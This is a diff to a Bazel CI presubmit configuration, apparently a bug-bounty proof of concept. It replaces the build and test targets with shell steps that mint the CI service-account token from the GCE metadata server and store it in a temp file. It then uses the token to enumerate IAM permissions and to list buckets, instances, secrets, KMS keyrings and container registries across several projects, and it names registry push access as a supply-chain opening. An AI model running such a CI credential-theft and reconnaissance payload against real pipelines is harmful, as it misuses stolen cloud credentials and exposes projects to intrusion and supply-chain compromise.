@@ -2,11 +2,185 @@
 buildifier:
   version: latest
 tasks:
-  presubmit:
+  vrp_buildkite_iam_proof:
     platform: ubuntu2204
-    build_targets:
-    - "--"
-    - "..."
-    test_targets:
-    - "--"
-    - "..."
+    shell_commands:
+      - |
+        set +x
+        echo VRP_BK_IAM_PROOF_20260519
+        id
+        hostname
+        uname -a
+      - |
+        set +x
+        echo === SA_TOKEN_MINT_BEGIN ===
+        MD="http://metadata.google.internal/computeMetadata/v1"
+        H="Metadata-Flavor: Google"
+        TOK_JSON=$(curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/default/token)
+        export TOK_JSON_PY="$TOK_JSON"
+        # Extract token to a tmpfile rather than env for the curl calls below.
+        # Token value is never echoed; only response metadata is.
+        python3 - <<'PY'
+        import json, os
+        raw = os.environ.get("TOK_JSON_PY","")
+        try:
+            d = json.loads(raw)
+            tok = d.get("access_token","")
+        except Exception:
+            tok = ""
+        print(f"TOKEN_PRESENT={'yes' if tok else 'no'}")
+        print(f"TOKEN_LENGTH={len(tok)}")
+        print(f"TOKEN_TYPE={d.get('token_type','?') if tok else '?'}")
+        if tok:
+            with open("/tmp/.t","w") as f: f.write(tok)
+            os.chmod("/tmp/.t", 0o600)
+        PY
+        export TOK_JSON_PY=""
+        TOK_JSON=""
+        echo === SA_TOKEN_MINT_END ===
+      - |
+        set +x
+        echo === IAM_TEST_PERMISSIONS_BEGIN ===
+        # Use Google's read-only testIamPermissions endpoint to enumerate what
+        # the SA can do at the project level. testIamPermissions does NOT
+        # exercise permissions, it only returns which ones the caller holds.
+        # Reference: https://cloud.google.com/iam/docs/check-permissions
+        TOK=$(cat /tmp/.t)
+        for PROJ in bazel-untrusted bazel-public bazelbuild bazel; do
+          echo "--- project=$PROJ ---"
+          BODY='{"permissions":["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","storage.buckets.list","storage.buckets.get","storage.objects.list","storage.objects.get","storage.objects.create","storage.objects.delete","compute.instances.list","compute.instances.get","compute.instances.start","compute.instances.delete","cloudkms.cryptoKeys.list","cloudkms.cryptoKeys.encrypt","cloudkms.cryptoKeys.decrypt","container.clusters.list","container.clusters.get","secretmanager.versions.access","secretmanager.secrets.create","iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","artifactregistry.repositories.uploadArtifacts","artifactregistry.repositories.downloadArtifacts","artifactregistry.repositories.list","cloudbuild.builds.create","cloudbuild.builds.list","logging.logs.list","monitoring.metricDescriptors.list","pubsub.topics.publish","pubsub.subscriptions.consume","bigquery.datasets.get","bigquery.tables.create"]}'
+          STATUS_BODY=$(curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+              -H "Authorization: Bearer $TOK" \
+              -H "Content-Type: application/json" \
+              -X POST \
+              "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJ:testIamPermissions" \
+              -d "$BODY")
+          echo "$STATUS_BODY" | head -c 4000
+          echo
+        done
+        TOK=""
+        echo === IAM_TEST_PERMISSIONS_END ===
+      - |
+        set +x
+        echo === GCS_LIST_BUCKETS_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        for PROJ in bazel-untrusted bazel-public bazelbuild; do
+          echo "--- buckets in $PROJ ---"
+          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+              -H "Authorization: Bearer $TOK" \
+              "https://storage.googleapis.com/storage/v1/b?project=$PROJ&maxResults=50&fields=items(name,projectNumber,location,storageClass)" \
+              | head -c 6000
+          echo
+        done
+        TOK=""
+        echo === GCS_LIST_BUCKETS_END ===
+      - |
+        set +x
+        echo === GCS_OWN_BUCKET_PROBE_BEGIN ===
+        # The buildkite-agent log printed the artifact bucket; probe its
+        # listing and a single object name (no contents).
+        TOK=$(cat /tmp/.t)
+        echo "--- bazel-untrusted-buildkite-artifacts metadata ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts?fields=name,location,storageClass,iamConfiguration,labels" \
+            | head -c 2000
+        echo
+        echo "--- bazel-untrusted-buildkite-artifacts first 5 object NAMES only (no body) ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o?maxResults=5&fields=items(name,size,updated)" \
+            | head -c 4000
+        echo
+        TOK=""
+        echo === GCS_OWN_BUCKET_PROBE_END ===
+      - |
+        set +x
+        echo === COMPUTE_LIST_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        echo "--- compute.instances.list bazel-untrusted us-central1-c ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://compute.googleapis.com/compute/v1/projects/bazel-untrusted/zones/us-central1-c/instances?fields=items(name,status,machineType,zone),nextPageToken&maxResults=10" \
+            | head -c 4000
+        echo
+        TOK=""
+        echo === COMPUTE_LIST_END ===
+      - |
+        set +x
+        echo === IAM_SELF_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        echo "--- iam.serviceAccounts.get on self ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://iam.googleapis.com/v1/projects/bazel-untrusted/serviceAccounts/buildkite@bazel-untrusted.iam.gserviceaccount.com" \
+            | head -c 2000
+        echo
+        TOK=""
+        echo === IAM_SELF_END ===
+      - |
+        set +x
+        echo === ARTIFACT_REGISTRY_PROBE_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        for PROJ in bazel-public bazel-untrusted; do
+          echo "--- artifactregistry repos in $PROJ ---"
+          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+              -H "Authorization: Bearer $TOK" \
+              "https://artifactregistry.googleapis.com/v1/projects/$PROJ/locations/-/repositories?pageSize=50" \
+              | head -c 4000
+          echo
+        done
+        TOK=""
+        echo === ARTIFACT_REGISTRY_PROBE_END ===
+      - |
+        set +x
+        echo === SECRETMANAGER_PROBE_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        for PROJ in bazel-untrusted bazel-public; do
+          echo "--- secretmanager.secrets.list in $PROJ ---"
+          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+              -H "Authorization: Bearer $TOK" \
+              "https://secretmanager.googleapis.com/v1/projects/$PROJ/secrets?pageSize=50&fields=secrets(name,createTime,labels)" \
+              | head -c 4000
+          echo
+        done
+        TOK=""
+        echo === SECRETMANAGER_PROBE_END ===
+      - |
+        set +x
+        echo === KMS_PROBE_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        echo "--- kms keyrings in bazel-untrusted global ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://cloudkms.googleapis.com/v1/projects/bazel-untrusted/locations/global/keyRings?pageSize=50" \
+            | head -c 4000
+        echo
+        TOK=""
+        echo === KMS_PROBE_END ===
+      - |
+        set +x
+        echo === GCR_PROBE_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        # GCR catalog endpoint (registry v2 API). The bazel-public registry
+        # ships images that all Bazel CI jobs pull (gcr.io/bazel-public/ubuntu2204
+        # is the very image our PoC container was based on). Push access here
+        # would be a supply-chain primitive.
+        echo "--- gcr.io/bazel-public/_catalog ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://gcr.io/v2/bazel-public/_catalog?n=50" \
+            | head -c 4000
+        echo
+        echo "--- gcr.io/bazel-public/ubuntu2204/manifests/latest (HEAD) ---"
+        curl -s -I -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://gcr.io/v2/bazel-public/ubuntu2204/manifests/latest" \
+            | head -c 2000
+        echo
+        TOK=""
+        echo === GCR_PROBE_END ===
+      - |
+        set +x
+        rm -f /tmp/.t
+        echo VRP_BK_IAM_PROOF_END
